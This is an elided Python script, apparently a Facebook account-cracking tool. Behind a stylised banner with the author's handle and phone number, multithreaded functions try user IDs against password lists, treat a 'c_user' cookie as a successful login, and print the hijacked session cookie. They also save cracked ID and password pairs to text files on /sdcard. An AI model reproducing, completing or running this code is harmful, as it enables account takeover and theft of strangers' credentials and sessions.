...
( \( -O )   ( OO ).-.                   
 ...
 `--' '--'  `--' `--'   `--'    `--'    
\033[1;93m┌━━━━━━━━━━━━━━━━━━\033[1;37m ━━━━━━━━━━━━━━━━━━━━┐
\033[1;37m│ ❲★❳ AUTHOR   : RAFI XHOWDHURY          │ 
\033[1;37m│ ❲★❳ GITHUB   : RAFI990             |
\033[1;37m│ ❲★❳ WHATSAPP : +8801301668047        │
...
def main():
    ...
    if sh =='5':
       ...
       menu()
    if sh =='6':
       os.system('xdg-open https://www.facebook.com/profile.php?id=61553192960864&mibextid=ZbWKwL ')
       main()  
...
def random_apk():
	...
	with ThreadPool(max_workers=50) as yaari:
		...
		print(f" {P}[{H}★{P}]{WHITE} FILE SAVE : RAFI-RNDM-OK.txt  ")
		print(f" {P}[{H}★{P}]{WHITE} FILE SAVE : RAFI-RNDM-CP.txt  ")
...
def apk(uid,pwx,tl):
    ...
    'user-agent': pro}
            ...
            if 'c_user' in log_cookies:
                ...
                oks.append(cid)
                open('/sdcard/RAFI-RNDM-OK.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
...
def fcrack(uid,pwx,tl):
    ...
    'user-agent': pro}
            ...
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print(f'\033[1;92m [RAFI>OK] '+uid+' | '+ps+'\33[0;92m')
                print(f'\033[1;93m   [💥] COOKIE (1) \033[1;92m : '+coki)
                #cek_apk(session,coki)
                oks.append(cid)
                open('/sdcard/JAR-RNDM-OK.txt', 'a').write(uid+' | '+ps+' | '+uid+'\n')
